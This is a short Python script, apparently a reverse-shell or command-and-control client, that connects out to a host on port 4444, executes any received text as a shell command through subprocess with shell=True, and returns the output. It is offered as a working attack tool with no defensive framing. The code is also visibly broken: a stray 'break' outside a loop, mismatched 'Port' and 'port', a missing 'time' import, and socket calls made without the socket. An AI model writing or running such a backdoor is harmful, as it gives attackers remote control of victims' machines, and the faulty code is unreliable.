import socket
import subprocess
import os

def set_sock(Host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((Host, Port))
    except socket.error:
        time.sleep(5)  # wait 5 seconds to try again
    else:
        break
    return s

def connect_cnc(s):
    while True:
        try:
            cwd = os.getcwd()
            send(os.getcwdb())
            byte_data = b""

            while True:
                command = recv(1024).decode()

                if command == "goback":
                    os.chdir(cwd)
                    break

                elif command[:2].lower() == "cd":
                    objCommand = subprocess.Popen(command + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                    if objCommand.stderr.read().decode() == "":
                        str_output = (objCommand.stdout.read()).decode().splitlines()[0]
                        os.chdir(str_output)
                        byte_data = f"\n{os.getcwd()}>".encode()

                elif len(command) > 0:
                    objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                  stdin=subprocess.PIPE, shell=True)
                    str_output = objCommand.stdout.read() + objCommand.stderr.read()
                    byte_data = (str_output + b"\n" + os.getcwdb() + b">")
                else:
                    byte_data = b"Error!"

                sendall(byte_data)

        except socket.error:
            s.close()
            del s
            set_sock(Host, port)

if __name__=="__main__":
    Host = "0.0.0.0"
    port = 4444
    s = set_sock(Host, port)
    connect_cnc(s)